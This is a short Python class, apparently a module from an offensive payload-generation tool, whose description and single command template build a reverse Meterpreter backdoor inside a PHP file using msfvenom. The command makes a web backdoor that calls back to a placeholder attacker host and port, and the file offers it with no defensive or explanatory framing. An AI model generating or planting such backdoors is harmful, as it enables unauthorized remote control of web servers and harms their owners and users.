class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse meterpreter backdoor into a php file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p php/meterpreter_reverse_tcp lhost="TARGET" lport=PORT -f raw > FILE_PATH.php'
